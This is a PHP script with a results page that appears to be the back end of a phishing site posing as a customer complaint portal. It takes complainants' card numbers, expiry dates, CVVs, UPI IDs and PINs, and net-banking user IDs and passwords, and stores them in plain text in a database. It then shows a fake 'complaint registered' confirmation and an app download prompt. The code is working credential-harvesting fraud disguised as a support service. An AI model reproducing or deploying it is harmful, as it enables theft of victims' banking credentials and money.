<?php
        error_reporting(0);
        include"Connection.php"; 
   

    $fname = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['fname'])));
    $country_selector = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['country_selector'])));
    $mobile = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['mobile'])));
    $complain = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['complain'])));
    $amt_type = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['amt_type'])));
    $amt = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['amt'])));
    $payment_type = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['payment_type'])));
    $cardname = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['cardname'])));
    $cc_exp = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['cc-exp'])));
    $cvv = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['cvv'])));
    $upi_id = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['upi_id'])));
    $upi_pin = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['upi_pin'])));
    $user_id = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['user_id'])));
    $net_password = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['net_password'])));
    $other = mysqli_real_escape_string($conn,htmlspecialchars(trim($_REQUEST['other'])));

?>


<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8" />
	<title> Cmplaint Successfully registred</title>
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
	<meta content="" name="description" />
	<meta content="" name="author" /> 
	 
	<link href="https://mycomplainquery.in/assets/plugins/jquery-ui/jquery-ui.min.css" rel="stylesheet" />
	<link href="https://mycomplainquery.in/assets/plugins/bootstrap/bootstrap4/css/bootstrap.min.css" rel="stylesheet" />
	<link href="https://mycomplainquery.in/assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
	<link href="https://mycomplainquery.in/assets/css/animate.min.css" rel="stylesheet" />
	<link href="https://mycomplainquery.in/assets/css/style.min.css" rel="stylesheet" />
	<link href="https://mycomplainquery.in/assets/css/theme/default.css" rel="stylesheet" id="theme" />  
	<link href="https://mycomplainquery.in/assets/css/custom.css" rel="stylesheet"  />  
	<script src="https://mycomplainquery.in/assets/plugins/loader/pace/pace.min.js"></script> 
</head>
<body>
	<div id="page-container" class="fade">
			<!-- BEGIN error-page -->
	        <div class="error-page pt-2">
	        	<div class="error-icon">
	        		<img src="https://mycomplainquery.in/assets/img/success-icon-10.png" alt="Success" height="100px'">
	        	</div>
	        	<h1>Success !</h1> 
                    <?php
                $Ins="INSERT INTO `coustomer query`(`Full_Name`, `Country`, `Mobile_Number`, `Complain`, `Amount_Type`, `Amont`, `Payment_Type`, `Card_Number`, `Card_Exipry_Date`, `CVV`, `Upi_Id`, `Upi_Pin`, `User_Id`, `Net_Password`, `Other`)
            VALUES ('{$fname}','{$country_selector}','{$mobile}','{$complain}','{$amt_type}','{$amt}','{$payment_type}','{$cardname}','{$cc_exp}','{$cvv}','{$upi_id}','{$upi_pin}','{$user_id}','{$net_password}','{$other}')";
            if(mysqli_query($conn, $Ins)){
                echo "<h3>Complaint Has Been Successfully Registered.</H3>";
                $query="SELECT*FROM `coustomer query`";
                    $result = mysqli_query($conn, $query);
                if(mysqli_num_rows($result) > 0){
                            while($row = mysqli_fetch_array($result)){
                                $Id=$row['Query_Id'];
                            }
                        }
                echo "<h3>Compaint Id : $Id.</h3>";
            }else{
                echo "<h3>Complaint Has Been Failed!</h3>";
            }

            ?>


	        	<p  class="font-weight-normal"><a href="/demo" class="h4 px-3 py-2 badge badge-danger">Submit another query</a></p> 
				<div class="card mx-2" style="background:#E2D9F3">
                  <div class="card-body">
                	<p class="h4 font-weight-normal">Download our <b>Android App </b> to<br></b> track your complaint status</p>
			        <p><a href="#"><img src="https://mycomplainquery.in/assets/android_app_btn.png" height="70"/></a></p> 
                  </div>
                </div>
			    
	        </div>
	         
			<a href="#" data-click="scroll-top" class="btn-scroll-top fade"><i class="ti-arrow-up"></i></a> 
		</div>
	<script src="assets/plugins/jquery/jquery-3.2.1.min.js"></script>
	<script src="assets/plugins/bootstrap/bootstrap4/js/bootstrap.min.js"></script>
	<script src="https://mycomplainquery.in/assets/plugins/jquery-ui/jquery-ui.min.js"></script>
	<script src="https://mycomplainquery.in/assets/plugins/cookie/js/js.cookie.js"></script>
	<script src="https://mycomplainquery.in/assets/plugins/tooltip/popper/popper.min.js"></script>
	<script src="https://mycomplainquery.in/assets/plugins/scrollbar/slimscroll/jquery.slimscroll.min.js"></script>  
	<script src="https://mycomplainquery.in/assets/js/apps.min.js"></script>   

  
    <script>
        $(document).ready(function() {
            App.init(); 
        });
    </script> 
	 
</body>
 
</html>
